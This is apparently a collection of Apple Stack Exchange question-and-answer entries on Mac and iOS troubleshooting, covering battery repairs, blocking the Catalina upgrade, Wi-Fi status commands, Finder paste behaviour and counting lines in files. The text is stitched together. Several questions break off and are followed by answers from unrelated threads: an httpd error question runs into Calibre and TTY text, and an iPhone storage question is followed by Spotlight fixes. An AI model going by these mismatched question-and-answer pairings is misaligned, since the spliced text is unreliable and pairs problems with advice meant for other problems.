\nLondon, UK      | Prague, CZ   | 2-3 weeks   | Estimate by Apple, 31 Aug 19\nMinneapolis, MN | Memphis, TN  | 2 days      | Apple quoted 2 weeks\n\n*feel free to update.\nAs for repair times, it would be good to specify where you will be shipping the MacBook and where the repair parts might be stocked. Just because the US might have ample stock, other countries might need the whole 2 weeks to ship and perform the repairs.\nThe rest of the timing is for US based repairs: I would say two weeks is much longer than we’re seeing in the US. We sent two last week for work and the box with the fixed Mac was delivered three days after the box was shipped. (So it was our of our hands for two days only.) Some repairs have taken us a week, but that’s the exception of the 25 or so we’ve sent in already.\nAlso, you will almost certainly see the case swell before any charge causes a fire in most cases so look for that as well.\nAs for putting out a LiPo battery fire, CO2 is a less good choice than water or sand. The battery has so much energy and generates it’s own oxygen so smothering it for a short time and cooling it a little with CO2 might not be effective. Of course use it if you have it, but go get a bucket of something or a shovel to lift and move the MacBook to a safer place where the fire won’t spread (concrete floor, outside, etc...)\n", "Q: Does anyone know if I can use Siri to make a phone call using Google Voice? Either that or place a call with the phone app using my Google Voice number.\nI ported my main number out to Google Voice. I want to be able to make hands-free phone calls from my main phone number on Google Voice, instead of the random phone number I have assigned to my iPhone. Using \"Hey Siri\" opens the iPhone app, so does Google Assistant.\n\nA: This depends on Google integrating their app with Siri as since iOS 10, developers can make their apps work with Siri using Siri Kit. So it’s up to a Google to do it, in the meantime, this isn’t possible.\n", "Q: How to block updates to Mac OS X Catalina? Mac OS X Catalina will be released in a few days, so how can I block updates to that OS so it doesn't get downloaded and, ideally, I don't even get prompts to upgrade.\nI have 32-bit software I intend to keep on using, so I can't update since this version of OS X will support 64-bit apps only.\n\nA: You can not block major updates after 10.15.5\n\n\n*\n\n*https://support.apple.com/en-us/HT210642\nBefore that update (and similar Summer 2020 updates to older OS - namely the 2020-03 update for High Sierra and Mojave, this command no longer works), you can ask Apple’s Software Update to ignore specific available upgrades to macOS Catalina:\n\n\n*\n\n*Open Terminal (in the Utilities folder in the Applications Folder)\n\n*Run sudo /usr/sbin/softwareupdate --ignore \"macOS Catalina\"\n\n*Enter your login password if asked, hit Enter and you should get confirmation that “macOS Catalina” updates will be ignored.\n\n\nLater, when you decide you want to allow the updates again, you can use:\nsudo /usr/sbin/softwareupdate --reset-ignored\n\n(With the Software Update preferences pane open, you can see the effect straightaway.)\n\nA: System Preferences -> Software updates -> Advanced. You will see options to toggle download and update choices. \nIt's hard to delay notifications more than a day. \n\nA: FYI - after installing the late May 2020 Security Update for 10.14.6, Catalina showed up again in Software Update, and redoing the previous fix makes no difference. In fact, it throws up this message:\n\"Ignoring software updates is deprecated.\nThe ability to ignore individual updates will be removed in a future release of macOS.\"\nIt would appear that this change has already taken effect.\n\nA: No way to solve the problem via the terminal using:\nsudo softwareupdate --ignore \"macOS Catalina\"\n\nThe reminder reappears after few days.\nIt seems that I solved by removing the SoftwareUpdateNotificationManager launcher.\nNamely, from /System/Library/LaunchAgents, move  com.apple.SoftwareUpdateNotificationManager.plist to /System/Library/LaunchAgentsIgnored.\nAdditionally (but it is not clear to me if really needed), I changed the notification configurations in /System/Library/UserNotifications/Bundles/com.apple.SoftwareUpdateNotification.bundle/Contents/Info.plist.\nNamely I changed the flags in\n<dict>\n    <key>UNDaemonShouldReceiveBackgroundResponses</key>\n    <true/>\n    <key>UNDefaultSettings</key>\n    <dict>\n        <key>UNSettingAlerts</key>\n        <true/>\n        <key>UNSettingAlwaysShowPreviews</key>\n        <true/>\n        <key>UNSettingBadges</key>\n        <true/>\n        <key>UNSettingModalAlertStyle</key>\n        <true/>\n        <key>UNSettingSounds</key>\n        <true/>\n    </dict>\n    <key>UNHideSettings</key>\n    <true/>\n    <key>UNNotificationIcons</key>\n    <dict/>\n    <key>UNSuppressUserAuthorization</key>\n    <true/>\n\nNamely the UNSuppressUserAuthorization flag. However the effect of these flags should be investigated.\nA more drastic solution could be to remove the SoftwareUpdateNotification Manager from the core services.\nNote that, in order to make these changes, you must boot from another disk, otherwise System is read only.\n\nA: if your OS version is \"mojave 10.14.6\", you will get the displays:\n\nIgnoring software updates is deprecated.\nThe ability to ignore individual updates will be removed in a future release of macOS.\n\nAnd I has fixed it by run\ndefaults delete com.apple.preferences.softwareupdate LatestMajorOSSeenByUserBundleIdentifier\nsoftwareupdate --list\n\n(Taken from https://tinyapps.org/blog/202005070700_remove_catalina_notification_badge.html)\n\nA: If you are on an earlier major version, such as High Sierra or Mojave, and all you are interested in is how to \"block updates\" to Catalina, ie prevent the upgrade from automatically occuring, then you don't need to do anything.\nAt least as of Sep 2020, Apple does not force major version upgrades. Even if you have Sys Prefs > Software Upgrade > Automatically keep my Mac up to date checked, or all of the options under Advanced (including Install MacOS updates) checked, your machine will not will automatically install Catalina.\nApple has gotten very naggy about pushing the Catalina upgrade lately, even deprecating the ability to ignore the update prompt, per @Robughblah's answer. But you still have to click on 'Upgrade Now' in the Catalina upgrade prompt in System Updates for it to occur.\nIf by \"block updates\", you are interested not just in preventing the upgrade, but in preventing prompts to upgrade to Catalina from appearing in Software Updates at all, Apple have made that harder, but there is still a way, outlined in my answer here.\n\nA: Not sure if this works in macOS Catalina, but in Mojave you can uncheck Install macOS updates in System Preferences > Software Update > Advanced.\nWith this method you'll still be notified that macOS wants to update to the next OS release, but you won't be forced.\n\n", "Q: Family sharing and non-organizer's previous purchases So, my wife has been using her iPad for a while, I have been using it for a while. Now, we added both of us to a family account (with me being organizer). And, while I purchased an app which my wife had already purchased (before we set up the sharing), my assumption was that I wouldn't pay for it. But to my surprise, my card got charged. Is this the expected behavior?\n\nA: It sounds like you went into the App Store > Searched for the App > Installed. Rather, with Family Sharing, you would want to navigate to the App Store > Tap your icon in the upper right corner > Purchased > from here you should see each member of the Family. Tap into one of them to view their purchases & ultimately download free of charge. When it is being downloaded free of charge you will see the iCloud icon with an arrow pointing down.\nHope that helps!\n", "Q: How do I fix macOS Mojave httpd syntax error in a localhost setup?

(And the CalibreCompanion directory functionality seems broken.)\nupdate: Ideally I'd like to synchronize with Books.app just like I can sync with a Kindle or any other ebook reader. I can open the paths from Calibre and drop files into Books but this is very tedious when handling many books.\n\nA: I just drop the files, pdf or epub,  onto the open iBooks window on a mac.

Seeing that multiple TTYs exist on FreeBSD and Darwin, and they provide the core of macOS and iOS, how would I access such TTYs? And would they be multiple instances of GUIs or would they involve terminals? I would very much prefer for there to be an environment similar to FreeBSD for testing purposes.\nPlease enlighten me as to whether or not such environments exist (or can exist) on Apple's OSes. I am interested in whether or not I can create one as a proof-of-concept, whether it can be on iOS 13 beta, iOS 5, macOS Mojave, or macOS Snow Leopard.\n\nA: TTYs exist and operate in Mac OS X and macOS just as they do in any other UNIX or UNIX-like operating system. When macOS boots, the TTY that inits to subsequently load the GUI is always console. Subsequent TTYs opened from Terminal.app or other emulators are listed from ttys000 and the digits increment one at a time.\nYou can open Terminal and check your TTY as in the examples below:\n$ tty\n/dev/ttys000\n\nOr\n$ who\ntrane    console  Sep  1 05:18 \ntrane    ttys000  Sep  1 05:19 \ntrane    ttys001  Sep  1 05:19\n\nOr\n$ w\n13:04  up 1 day,  7:46, 3 users, load averages: 1.85 2.02 3.87\nUSER     TTY      FROM              LOGIN@  IDLE WHAT\ntrane    console  -                Sun05   31:45 -\ntrane    s000     -                Sun05       - w\ntrane    s001     -                Sun05       9 -bash\n\nFor more information on those commands, see the relevant man pages.

It's in an obscure location, so you have to specify the entire path to it (or make an alias, like I have). I find the -I (show current status) and -s (scan for networks) options most useful (although they're considered \"legacy\"). Here's an example:\n$ alias airport=/System/Library/PrivateFrameworks/Apple80211.framework/Versions/Current/Resources/airport\n$ airport -I\nAirPort: Off\n$ # [Switches radio on...]\n$ airport -I\n     agrCtlRSSI: -49\n     agrExtRSSI: 0\n    agrCtlNoise: -88\n    agrExtNoise: 0\n          state: running\n        op mode: station \n     lastTxRate: 300\n        maxRate: 300\nlastAssocStatus: 0\n    802.11 auth: open\n      link auth: wpa2-psk\n          BSSID: 88:d7:f6:25:c4:37\n           SSID: NotMyRealName\n            MCS: 15\n        channel: 40,-1\n\nYou can use the -h flag to get a list of its options.\n\nA: You can use the ifconfig command, e.g.:\n$ ifconfig en0 \nen0: flags=8863<UP,BROADCAST,SMART,RUNNING,SIMPLEX,MULTICAST> mtu 1500\n    ether # Removed for Security. \n    inet6 fe80::c44:6ce5:5d57:5b93%en0 prefixlen 64 secured scopeid 0x9 \n    inet 192.168.2.101 netmask 0xffffff00 broadcast 192.168.2.255\n    nd6 options=201<PERFORMNUD,DAD>\n    media: autoselect\n    status: active\n$\n\nYou can also filter the output, e.g.:\n$ ifconfig en0 | awk '/status:/{print $2}'\nactive\n$ \n\nWhen not active the output is, e.g:\n$ ifconfig en0 | awk '/status:/{print $2}'\ninactive\n$\n\n\nIf you do not know the device name for the Wi-Fi network adapter, you can use the following examples:\n$ networksetup -getairportpower $(system_profiler SPAirPortDataType | awk -F: '/Interfaces:/{getline; print $1;}')\nWi-Fi Power (en0): On\n$\n\nOr:\n$ ifconfig $(system_profiler SPAirPortDataType | awk -F: '/Interfaces:/{getline; print $1;}') | awk '/status:/{print $2}'\nactive\n$\n\n\nA: The way to simply get the device name is to use the listallhardwareports option of networksetup. It neatly prints out all the device names for each interface immediately (e.g. it does not need to poll the device status and take a couple seconds to return like system_profiler does).\nBuilding off of user3439894's answer, the command to programmatically get the \"Wi-Fi\" adapter name would be:\nnetworksetup -getairportpower $(networksetup -listallhardwareports | awk -F: '/Wi-Fi/{getline; print $2;}')\n\nThis can be used for any adapter name (not just Wi-Fi), and could easily be paramaterized in a script, e.g.\ngetDeviceNameFromAdapterName() {\n    networksetup -listallhardwareports | awk -v adapter=\"$1\" -F : '$0~adapter{getline; print $2;}'\n}\n\n\nA: Here's the command I used to check if Wi-Fi enabled on my Mac.\nnetworksetup -getinfo Wi-Fi | grep ^Router\n\n", "Q: Can a brand-new iPhone be stored in its box long-term?

It should help you to fix your issue too.\n\nA: With all the deleting of files that spotlight depends on, I would write off that system entirely. Make a good backup - maybe two if you use Time Machine which may not have a good backup due to spotlight and the filesystem likely being suspect or corrupted.\nErase the entire volume and then test spotlight on a clean install. Once you are convinced the hardware is working with none of your old data or system present, you can erase again and migrate back your data or run Migration Assistant and/or migrate back by hand.\nIn the future, when you suspect a spotlight issue - I would run mddiagnose which dumps all the log files and data needed to determine the state, error, conditions of the spotlight / mds / metadata collection and indexing subsystems as well as system logs that can help show issues.\nIn most cases where we see this, it's corrupt data (bad spotlight importer crashing) as the system crawls all the data that causes things, so restarting that process doesn't fix the underlying issue. With all you've done, it's going to be very hard to find out the case but you could try working with Apple Support on a mddiagnose analysis or take a stab at reviewing it yourself.\n\nA: For anyone whom it may concern: I ran into this problem on High Sierra. I tried everything including a system restore without luck. Finally I discovered that I had an extension running called Paragon NTFS. After removing this, things started to work again. \n\nA: Solution which worked for me.  I completely lost Spotlight function, tried so many  suggestions to restore Spotlight indexing, to no avail.  Until now.  The process is: Close SystemUIServer\n\"Start by simply resetting a particular process. This quick and easy step often solves spotlight related issues. First, launch Activity Monitor by opening Finder and going to the Applications folder. Then, go to Utilities and choose Activity Monitor. In the window, look for SystemUIServer in the list, or use a search field to find it quickly. Select this process and then click on the quit process button. When you close this process, the menu bar and dock will reload within a few moments - this is a sign that the process has been reset. Check if Spotlight issues are fixed.\"\nThis is taken from this link:https://blog.pcrisk.com/mac/12708-spotlight-search-not-working-on-mac-how-to-fix\nVery simple, and Spotlight indexing immediately restored.  \n\nA: Go to system Preferences and click on Spotlight. This brings up a panel where you tell Spotlight where to search. Check that Applications is checked.

This means I have to keep it constantly charged, or my computer may shut down suddenly as the battery plummets. But the charger is also old, and so sometimes if i shift the computer around it disconnects suddenly without my knowledge. Is there a way to set an audio alarm for when the computer disconnects from the charger? The only solutions online i found are for when the battery gets low, which may not occur because the battery drops and raises its percentage without warning, or unavailable in singapore.\nthanks\n\nA: This can be done by using the pmset -g batt command. The first line of output from this command indicates your power source, e.g.:\nNow drawing from 'AC Power'\nOr\nNow drawing from 'Battery Power'\nA possible use for this might be to change various commands together in a batch file, e.g.:\npmset -g batt | head -n 1 | grep \"Battery\"\n\nIn the above example, you'll only get output when you're running on battery power. So, a reasonable approach might be to use a bash script running via launchd or as a hidden Login Item in your profile. Something like this would work a charm:\n#!/bin/bash\nwhile true; do\n  if $(pmset -g batt | head -n 1 | grep -q \"Battery\"); then\n      say \"Running on battery\";\n      sleep 5;\n  fi\nsleep 5;\ndone\n\n", "Q: AirPods not charging due to contact issue between the AirPod and the case After placing both AirPods in the case and taking them out long after they should've been fully charged, I noticed that the left AirPod was at 1%, while the right AirPod was at 100%. This happens every now and then, and thus I know it is a contact issue, but I don't know how to fix it.\nAny ideas?\n\nA: Try these solutions in the following order:\n\n\n*\n\n*Cleaning the lightning port*;\n\n*Cleaning the inside of the case*;\n\n*Instead of manually inserting the AirPods in the charging case all the way, insert just a portion of them, and let them fall in the case. The gravity and the magnetic attraction will place them in the right position, thus allowing them to charge. Surprisingly, inserting them manually all the way might not place them in the right position;\n\n*Place a small piece of paper on the inside of lid so that when it is closed, it presses the AirPods against the connector**;\n\n\nIf none of these options worked, the case and/or the AirPods might be broken and need to be looked at by an authorized technician\n\n\n*with a sharp object that doesn't conduct electricity (like a toothpick)\n** This solution should be used as a last resort, since it might potentially damage the opening/closing mechanics of the lid\n\n", "Q: Difference between an https proxy and a VPN as far as I know, both proxy and VPN forwards traffic under their IP-Adresses and not yours. Also, a vpn is more secure than a proxy, because in a vpn the connection\nis end-to-end secured. Using a proxy, the message can by easily read.\nBut now, if I use the https protocol and a proxy, it should have the same security level as using a vpn, right? Because even if I log the traffic on the proxy server, I cannot read the messages, because they are encrypted. \nSo my final question:\nWhy shouldn't I use a proxy with https (which is cheaper or free) rather than using an expensive vpn solution?\nKing regards and thank you for all your inputs!\n\nA: In your example it is not possible to say whether the HTTPS protocol + Proxy has the same security level as a VPN. It really depends a lot on the specifics - i.e. which VPN software, what settings, etc.\nHowever, in general you could say that it is possible to configure an SSL/TLS encrypted proxy and a VPN software to do the same kind of encryption with the same key sizes etc. so that they are \"on level\". \nWhen you visit a web site that is by itself encrypted (i.e. using SSL/TLS) many encrypted proxies works by essentially being a \"man in the middle\". Often this means that you install the proxy server's certificate as a trusted certificate in your operating system or browser, and all traffic from the web site is really decrypted on the proxy server and then re-encrypted for transmission to the client. This allows the operator of the proxy server to read all traffic in clear. Obviously this is a negative.\nHowever some proxy servers work by essentially just passing the raw date to and from the same way a VPN would do - thus keeping the SSL/TLS encrypted connection to the website all the way from browser to web site.\nSo it depends a lot on the actual chosen proxy server software, its configuration, the circumstances, etc.\nYour other question about whether to use free/cheap proxy or expensive VPN is also impossible to answer without knowing the specific. A free system might be really good, and an expensive system might be rubbish. It could also be the other way around.\nIn general the main difference is that it is easier to configure VPN to handle all traffic coming out from your PC - no matter the application or service. With proxy servers it is really on an application to application basis - so you risk \"leaking\" information that is not sent via the proxy server.\n", "Q: Can I charge a DC 5V - 2.15 A power bank with an Apple Macbook charger?

The power bank accepts standard USB power, and the MacBook charger with USB-C will be just that when you add the USB-C to micro-USB cable.\nNote ofcourse that it won't charge faster than the standard charger. Even though the MacBook charger is a 29W charger, it won't charge your power bank at the full rate (instead it will charge at somewhere between 2.6W and 7.8W - most probably at 4.68W).\n", "Q: How to make the Feedback Assistant app visible in the Launchpad?

Maybe using this feature will enable one to create and zip a bash executable and retain its attributes once unzipped on a Mac. I haven't tested it, so this is more informational then a working answer.\nThere are quite a few steps in the two linked articles and so as not to make this a so called link only answer, since I'm not quoting any of the steps, let me tell you something you can do from Windows that will work for sure...\nInstall Linux in a Virtual Machine and do your scripting, make it executable, and zip it up in the Linux VM. A zipped bash executable from a Linux Virtual Machine will be executable on macOS when unzipped.\n", "Q: Office Mac 16 - Disable recent items list All Office applications offer a Open Recent... submenu (under File menu) that lists recent opened files.\nIs there a way to disable Open Recent... or set to zero the number of listed files?\n\nWhy I want to disable Open Recent...:\nThe mentioned submenu is usefull. However the application attempts to access all listed recent files when File menu is selected (don't ask my why...)\nIf a recent file is stored on a unmounted disk image or network share the finder attempts to mount the volume.\n\nA: Setting to zero Finder's menu recent items count (via System Preferences > General) also sets to zero all Office applications' Open Recent... items count.\n\nNot a definitive solution but a viable workaround until Microsoft fixes the issue (assuming that is a bug that Office apps \"touch\" all files listed in Open Recent... when File menu is clicked)\n", "Q: Wrong caller ID showed for call and \"000000\" in calls journal My friend has an issue with her iPhone. For some reason, the phone app suddenly started to show the wrong caller name. After this she tried to logout/login into iCloud and then all callers in the call journal displayed as \"00000000\". In the Contacts app she can see the correct names with matching phone numbers. Sometimes, the call can have the name of one contact but photo of another one. Contacts are also sometimes shuffled for outgoing calls. Same problem with iMessage.\n\nThis is not a new phone, there have been no restores from backup recently, also there have been no new iOS devices connected to this Apple ID recently. She has been using the same phone company for a long time (Vodafone).\nAnd these 00000000000 calls are not spam, it's a real people.\nThe phone was updated iOS 12.4.1 when she got this issue and it didn't help - she still had broken contacts.\nAny ideas how to fix it?\n\nA: I would suggest the following solution but you need to take care of it from Macbook which is using same Apple ID. \nIt is best to always have a backup before attempting something like this\n\n\n*\n\n*Open the AddressBook folder located on:\n~/Library/Application Support/AddressBook\n\n*In that folder, you will find three files:\na.  addressbook-v22.abcddb\nb. addressbook-v22.abcddb-wal\nc. addressbook-v22.abcddb-shm\nDelete them. \n\n\n*Open Contacts and your list of contacts should quickly populate as the index is rebuilt.\n\n", "Q: Symlinks became files, containing relative paths, within an app bundle, why? How to fix? I discovered an interesting form of corruption within some application bundles which had been stored on a file server for months and years. \nThe application bundles were installers for various macOS versions, if it matters. I attempted to run Install macOS High Sierra.app. It ran for a few seconds, then hung. I had to Force Quit the installer from Activity Monitor. The relevant clue in the Console was:\n\n2019-09-02 05:44:29.222 com.apple.xpc.launchd[1]:\n  (com.apple.install.osinstallersetupd[11106]) Could not find and/or\n  execute program specified by service: 2: No such file or directory:\n  /Applications/Install macOS High Sierra.app/Contents/Frameworks/OSInstallerSetup.framework/osinstallersetupd\n\nUsing the Terminal to explore the contents of the installer app (which is of course a Application Bundle directory), I found this where the installer was looking for osinstallersetupd:\n% cd /Applications/Install\\ macOS\\ High\\ Sierra.app/Contents/Frameworks/OSInstallerSetup.framework\n% ls -l\ntotal 16\n-rwxrwxrwx  1 jdlh  admin   33  9 Jul  2018 OSInstallerSetup\n-rwxrwxrwx  1 jdlh  admin   26  9 Jul  2018 Resources\ndrwxrwxrwx  4 jdlh  admin  136  9 Jul  2018 Versions\n% more OSInstallerSetup \nVersions/Current/OSInstallerSetup\n% more Resources \nVersions/Current/Resources\n\nSo interestingly, OSInstallerSetup and Resources were plain files, containing relative paths as text. I looked in the corresponding place in a freshly-downlowed, and correctly running, installer:\n% ls -l /Applications/Install\\ macOS\\ Mojave.app/Contents/Frameworks/OSInstallerSetup.framework \ntotal 16\nlrwxr-xr-x  1 root  wheel   33  2 Sep 05:23 OSInstallerSetup -> Versions/Current/OSInstallerSetup\nlrwxr-xr-x  1 root  wheel   26  2 Sep 05:23 Resources -> Versions/Current/Resources\ndrwxr-xr-x  4 root  wheel  136  2 Sep 05:23 Versions\n\nSo it seems OSInstallerSetup and Resources were supposed to be symbolic links (\"symlinks\"), not files. \nI had downloaded this installer in mid-2018 to my MacBook Pro, then copied it using Finder to the file server. The file server presents an AFP volume to my Macbook using netatalk software. I would expect the Finder to copy symbolic links correctly. \nWhat might have caused this corruption?  How can I detect other instances where it occurred, in this app and in others? Can I repair the corruption? It seems like it ought to be possible, given that the file which replaces the symlink has contains the relative path the symlink should have. How can I prevent it from happening again?\n\nA: You might have been using Apple network-transport protocols, but the underlying file-system your server uses is not HFS or APFS, and probably isn't n-fork capable either. Symlinks in both of Apple's file-systems rely on inode referencing, and if the file-system doesn't have some form of compliance capability then items with metadata as fork references and inode lookups doesn't really have much chance of surviving intact.\nThis is why non-app-store software is often distributed in .dmg format, because they are a wholly self-contained island of Apple compliance stored as a single contiguous data-block, allowing it to pass through hostile servers and deadly file-systems with impugnity.\nThat's the cause – as for detection, only trying to run the suspect to see what happens. macOS installers are vastly complex, the bigger the app the greater the chance they'll rely on internal symlinking and thus the higher the possibility that they're now little more than useless bytes .... because you can't repair apps that have been damaged in such a manner.\nPrevention: Turn apps & installers back into .dmg files (with a handy drop tool like QuickDMG for archival purposes.\n", "Q: Booting into safe mode without keys I have a jailbroken iPhone 6s running iOS 12.2.

Unchecking iCloud photos >> Repair >> Recheck\n4. Unchecking iCloud photo >> New library >> Recheck\n5. Numerous restarts of the OS in between...\nNothing seems to help! \nAny ideas? \nThank you in advance!\n\nA: Here are some solutions found on this Link\n\n1) Check the Internet connection on your devices, As you may know, a\n  stable network connection on your iOS device and Mac is required to\n  upload photos to iCloud. Thus, you need to make sure the Wi-Fi network\n  connection works properly on your Mac and your iPhone (or other iOS\n  devices). If you find Wi-Fi not working on your devices, learn how to\n  fix it from the related article.\nThis is the first solution you should try when iCloud photos do not\n  sync to Mac or photos are not downloading from iCloud to Mac.\n2) Check your Apple ID To sync photos across your Mac and iOS devices,\n  you have to sign in to iCloud on these devices with the same Apple ID.\n  When you find iCloud photos not syncing to your Mac, go to check your\n  Apple ID and see whether it’s the cause of the issue.\n3) Turn on iCloud Photo Library and My Photo Stream To access photos\n  your photos and videos from all your devices, you need to turn on\n  iCloud Photo Library/My Photo Stream on both your iOS device and\n  computer. If iCloud photos are not syncing to your Mac, you should\n  also check whether the options are set up correctly.\nOn iPhone/iPad: Go to Settings > [your name] > iCloud > Photos and\n  then switch on iCloud Photo Library and My Photo Stream. On Mac: Go to\n  System Preferences > iCloud, make sure Photos is selected and click\n  Options next to it. Then turn on iCloud Photo Library and My Photo\n  Stream.\n4) Check your iCloud Storage Apple provides 5GB of iCloud space for\n  free. But 5GB is generally not enough for you to store your iPhone\n  photos and videos. It's possible that iCloud Photos Not Syncing to Mac\n  is due to insufficient storage in iCloud. If that’s the case, you can\n  either buy more iCloud storage or go to Apple Menu > System\n  Preferences > iCloud to manage iCloud space on your Mac.\n\nI hope this helped fix your macbook pro.\n", "Q: check why iPhone restarted Is there a way to check why iPhone restarted? My iPhone restarted once during the day, not being connected to power, so I believe that wasn't update. It happened just once today, so I'm curious what was a reason to restart. \n\nA: I had the problem of my iPhone 6s randomly restarting. It might not be the same problem you're having, but it will give you something to check. \nFor me, the restarting problem occurred several times in the months leading up to the phone dying. Well, let me be more specific: about a month after experiencing the random restarting problem, I began to notice the phone wasn't holding a charge. So I called Apple support and they had me check Settings-->Battery-->Battery Health. \nIn that section it showed I had \"Maximum Capacity 87%\" but then below that in the \"Peak Performance Capability\" section it had a message indicating there had been a problem (I can't remember, but the message was something like performance monitoring had been turned off because the battery couldn't supply enough power).\nAfter that I took the phone in to an Apple service center to get the battery replaced, but was told that it wasn't that easy: there was a problem with the power supply which meant a hefty repair. That's when I changed phones.\nSo, I'd check the above settings, keep an eye on your battery performance, and perhaps call Apple if things go downhill.\n", "Q: Turn off \"this web page is using too much battery\" on safari Safari prompts \"this web page is using too much battery\" and restarts the web pages.

If it's upto to kill the process, preventing notifications will not stop it.\nHere are few troubleshooting tips.\n1) Check your disk space where your OS is installed. Free if needed (Swap memory reason)\n2) Check your HDD & Battery health. You can get few freeware utilities.\n3) Check temperature of your system. It often crash apps or even restarts the devices. \n4) Clear the browser cache folder from base.

It puts an icon in your menu bar and when you click on it. it will show a list of Volumes and you can mount or unmount them. The app is $6 but has a free trial period so you can test it and see if it solves your problem.  See image below.\n\n\nA: I have encountered this problem but in my case, Bootcamp had created the problem. I mounted the disk in Windows (Bootcamp) and apparently, the disk did not eject properly. So when I switched to Mac OS, I found the disk unmounted but not able to eject it. In Disk Utility it appeared pale. So I did like below:\n\n\n*\n\n*Step 1\n\n\nsudo lsof | grep \"/Volumes\"\n\nYou would see the result something like this:\nmds       1071     root    6r      DIR    1,2       8192     2 /Volumes/BOOTCAMP\nmds       1071     root   11r      DIR    1,2       8192     2 /Volumes/BOOTCAMP\n\n\n\n*\n\n*Step 2\n\n\nThe second column is the id of a process that makes the disk in use.

But I have never entered a code, my daughter claims she didn't either, I don't know what computer it was originally set up with, and to add insult to injury, I don't even know where the cable went that connected to this thing.\n\nA: The first trick was to remember where I put the cable, which is apparently called the \"Apple 30-pin cable\".\nHaving the original Mac or iTunes was not necessary.  I plugged the iPod in to a Linux device (although this should also work from any Mac with a Terminal window).

It's been a while since I've done this.\nThis article has a nice overview of all the necessary steps: https://www.imore.com/how-remove-hard-drive-partition-your-mac.\nIf this fails while you are running Mac OS, you can try starting it in recovery mode. Recovery mode has the same disk utility, but sometimes things fail when you are running Mac OS while trying to partition. You can start recovery mode by holding command+R while starting your mac.\n\nA: As far as I remember, you have to delete the partition with Bootcamp first before you can add it to the rest with DiskUtility.\n", "Q: Safari not opening local html files after upgrading to macOS Catalina Beta I recently upgraded to macOS Catalina (10.15 Beta (19A546d)) on my Mid 2014 MacBook Pro.

It does not have AirPlay 2 (but AirPlay is running fine).\nI wonder if I buy a AirPlay2 device if they are going to work with it ?\n\nA: AirPlay 2 is backward compatible.  You can use AirPlay 2 to play to any AirPlay compatible device.\nThe main difference, but not the only difference, is that AirPlay is 1:1; you can play to only one device.\nAirPlay 2 is 1:many; you can play from one device to multiple other devices.\nHere's a good write-up on AirPlay 2 and the benefits it brings.\n", "Q: Copy paste a file inside a folder in List view I am new to MAC\nLets say I have a folder named outer_folder and inside this folder there is another folder called inner_folder which has a file named inner_file1.pdf\nI opened the outer_folder in List view and then clicked on the arrow next to inner_folder and copy pasted the inner_file1.pdf expecting that the copy of the file will be created in inner_folder but the copy was created in outer_folder instead\nIs this a bug or is this how MAC is supposed to work? Is there a possibility to change this so that the copy is created in the inner_folder?\n\nA: This is a source of confusion to many.\nIn List view, the default paste location will be the outermost folder the window is opened from, ie the one named in the window header.\nWorkarounds are to either Cmd/double click to open your destination in a new window, or more simply right click your destination folder & use Paste Item from there.\n\nA: Sadly, yes, this is how Finder has always done things - it is mostly incapable of correctly parsing a multi-level file structure, as if there is no difference between a file (an object) or a folder (or directory). Finder only got cut-copy-paste as valid file handling actions a few years ago, but there's at least some conscientious coders on the Finder devteam, because Finder got folder-merge capability ... of a sort, and it only happens when you specifically request it to do so. And it won't work properly with keyboard commands, you have to drag stuff from one Finder window to another.\nSadly, we can't make Finder handle nestings and mergings the way File Explorer and all the *nix file-GUIs have done it for decades, nor can we get rid of Finder ... but we can ignore it, and use something else.\nIf you're cozy with the command-line, the ditto command handles directory merging in the normal sane fashion, but if you would prefera clicky-draggy-shortcuts GUI for file-handling, the best Finder substitute is a commercial app called Path Finder from Cocoatech.\n\nA: Using only the keyboard:\n\n*\n\n*Select the destination folder in Finder\n\n*Press Cmd+O to open the destination folder\n\n*Press Cmd+V to paste inside the destination folder\n\n*Press Cmd+[ to go back to the outer folder\n\n", "Q: Finder/Terminal: Find files that contain less than 21 lines of text I have lots of text files that have a different number of lines of text in them. \nIn Mac OS Finder, is there any way to search for files that are less than 21 lines? (i.e. each file has less than 21 line of text in them).\nThe Search for files gives lots of options, but I can't see one that is for line length. \nFrom reading up on the subject, it seems using Grep in Terminal may be the best way, but I haven't found any sources that explain how to use Grep to search for line length on multiple files. \n\nA: Here's another shell solution. We start from the current working directory . -\nfind . -type f -exec wc -l {} + | sed '$d'| awk '$1 < 21 { $1=\"\"; print}'\n\nfind filters just files and executes wc for all the files found. The output is piped to sed where we remove the last line which would be something like- ### Total.\nawk then processes each line of output for the first column to be less than 21 lines and prints the filename in column 2 of the output on wards. \n\nA: I'm not going to \"code golf\" this (shortest wins).. This is more like \"code basketball\".  \nBecause your needs are a bit complex, I say use the most tunable option. \nWe launch with \n Find (root directory) -type f | perl count21\n\nCount21 is a file that contains some perl. \n while (<>) {           # read each line of input into variable $_\n   chomp $_;               # Removing newline at end of line, if exists. It does.\n\n   local $/ = undef;    # Input will ignore newlines and slurp in entire file \n   open (my $IN, \"<\", $_);    # immune to < > ' \" tab etc. in filename\n   my $text = <$IN>;          # read entire file\n   chomp $text;               # remove last newline if exists, so files with or \n                              # without trailing newlines are the same.\n\n   $lc = ( $text =~ tr/\\n// ) + 1;  # tr/\\n// counts newline characters. \n                                    # $text =~ says apply this operation to $text. \n                                    # The value of this operation is char count.\n                                    # Add 1 so we count the last line.\n                                    # This count will be wrong on 0-line files,\n                                    # but that's outside of problem scope. \n\n   if (21 >= $lc) {                 # if $lc <= 21 (Putting var first is bad luck) \n      print $_, \"\\n\";               # print filename, and a newline\n   }      # endif\n\n} # end while(<>)\n\nBothering with all this perl and avoiding every shortcut seems super stupid.  The reason to do it is you can far more easily cope with unexpected wrinkles, like the \"some lines don't end in newline\" problem, easily fixed with a chomp and a +1 here.  \nThis also nukes-from-orbit the problem you'd have with passing file lists in shell, such as filenames with spaces, \", ', |, tab and other monkeywrenches. Unfortunately piping from Find won't handle  newline in a filename, but the Perl File::Find module will.\nIt also makes it easy to shim in even more stuff: for instance if you only want files with \"diddle\", add \n next if not ( $text =~ /diddle/i ); \n\n\nA: In Terminal you can combine find and wc for this:\nfind /path/to/directory -type f \\\n    -exec bash -c '[[ $(wc -l < \"$1\") -lt 21 ]]' _ {} \\; -print\n\nThis will find all files (-type f) beneath /path/to/directory, count the lines (wc -l < \"{}\", {} gets replaced by any file found) and print the file name for files containing less than 21 lines. \nPS: It will also try to count the lines in non-text files. If this causes issues, use the following instead:\nfind /path/to/directory -type f -exec bash -c 'file -b \"$1\" | grep -q text' _ {} \\; \\\n    -exec bash -c '[[ $(wc -l < \"$1\") -lt 21 ]]' _ {} \\; -print\n\nPPS: To start from the current directory, replace the path at the beginning with .

